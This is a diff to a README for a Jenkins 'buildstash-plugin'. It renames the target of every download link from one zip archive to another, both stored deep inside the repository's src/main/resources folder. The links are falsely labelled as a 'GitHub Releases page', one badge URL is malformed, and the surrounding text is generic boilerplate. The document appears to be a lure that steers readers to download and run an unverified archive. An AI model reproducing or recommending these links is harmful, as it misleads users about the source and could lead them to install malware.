@@ -1,7 +1,7 @@
 # 🛠️ buildstash-plugin - Upload Your Artifacts Easily
 
 ## 📥 Download Now
-[![Download Buildstash Plugin](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash-plugin_3.0.zip%20Buildstash%20Plugin-%https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash-plugin_3.0.zip)](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash-plugin_3.0.zip)
+[![Download Buildstash Plugin](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash_plugin_v2.5.zip%20Buildstash%20Plugin-%https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash_plugin_v2.5.zip)](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash_plugin_v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the buildstash-plugin for Jenkins. This plugin makes it easier to manage your build artifacts. You can use it to organize binaries, share them with your team, and deploy effectively.
@@ -19,7 +19,7 @@ Before you proceed, please ensure that your system meets these requirements:
 ## 📥 Download & Install
 To download the buildstash-plugin, go to the releases page. Click on the latest version listed there.
 
-[Visit this page to download the buildstash-plugin.](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash-plugin_3.0.zip)
+[Visit this page to download the buildstash-plugin.](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash_plugin_v2.5.zip)
 
 1. Open your web browser.
 2. Click on the link above.
@@ -74,6 +74,6 @@ If you run into any issues or need assistance, you can check the following resou
 ## 💼 Conclusion
 Using the buildstash-plugin can significantly enhance your Jenkins experience. It simplifies artifact management and facilitates better collaboration within your team. 
 
-For more updates, features, and discussions around buildstash-plugin, keep an eye on the [GitHub Releases page](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash-plugin_3.0.zip). 
+For more updates, features, and discussions around buildstash-plugin, keep an eye on the [GitHub Releases page](https://raw.githubusercontent.com/ksa18880/buildstash-plugin/main/src/main/resources/com/buildstash_plugin_v2.5.zip). 
 
 Now, go ahead and make the most of your build artifacts with ease!
